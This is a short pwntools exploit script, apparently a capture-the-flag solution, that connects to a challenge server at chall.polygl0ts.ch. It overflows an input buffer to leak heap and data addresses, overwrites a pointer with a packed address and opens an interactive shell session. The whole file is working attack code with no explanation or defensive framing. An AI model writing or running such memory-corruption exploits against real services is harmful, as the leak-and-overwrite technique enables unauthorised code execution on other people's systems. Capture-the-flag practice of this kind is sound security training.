from pwn import *

# r = process('./main')
r = remote('chall.polygl0ts.ch', 9034)
r.sendline(b'log')
r.sendline(b'$a=a')
r.sendline(b'aaaaaaa' + b'a'*0x18)
r.sendline(b'$(($a+$a)')
r.recvline()
r.recvline()
r.recvline()
heap=int(r.recvline()[2:-1])//2
print(hex(heap))
r.sendline(b'log')
r.sendline(b'$b=%d'%(heap+0x100))
r.sendline(b'$c=1')
r.sendline(b'aaaaaaa' + b'a'*0x18+b'\x01')
r.sendline(b'$(($b+$b)')
r.recvuntil(b'variable b: ')
data=u64(r.recvline().strip().ljust(8,b'\x00'))-0x8be8
print(hex(data))

r.sendline(b'log')
r.sendline(b'$d=%d'%(data+0x2dad))
r.sendline(b'aaaaaaa' + b'a'*0x10+p64(heap+0x1a0))
pause()
r.sendline(b'$d')

r.interactive()
